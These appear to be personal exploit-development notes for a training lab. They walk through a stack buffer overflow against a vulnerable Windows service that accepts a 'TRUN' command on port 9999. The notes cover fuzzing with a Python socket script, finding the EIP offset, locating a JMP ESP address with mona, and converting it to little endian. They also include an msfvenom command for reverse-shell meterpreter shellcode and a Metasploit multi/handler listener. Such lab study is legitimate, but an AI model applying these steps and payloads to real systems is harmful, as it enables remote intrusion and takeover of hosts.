# Static analysis 
strings.exe -a -nobanner <filepath> | findstr /i enter
# -n specifies minimum string length
strings.exe -a -n 5 -nobanner <filepath> | select -first 10

Behavioral analysis:
-need to know windows IP address
get-process | findstr /i vuln
netstat -anop tcp | findstr <PID>
kill 3928

Dynamic Analysis
Immunity > File > open > <file>
Check status "Paused" or "Running" (bottom right), use rewind and play buttons
Use wiremask, generate string. Run the script, check the EIP in immunity
Throw EIP value into wiremask to get offset.

Find JMP ESP, in Immunity
!mona modules, look for dll with all falses (essfunc.dll)

###Search for jmp esp
!mona jmp -r esp -m "essfunc.dll"
window > log data > right click copy address 625011AF
convert to little endian:
AF115062 -> "\xaf\x11\x50\x62" # Convert to little endian for py script

# Start Multihandler, on Linops
msfconsole
use multi/handler
show options
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit

#Shell code
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.186.9 lport 4444 -b "\x00\xfe\x20\x0a\xff" -f python
leave out first buf += "" line

script:
#!/usr/bin/python
import socket

buf = "TRUN /.:/"
buf += "A" * 5000

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.186.14", 9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close()
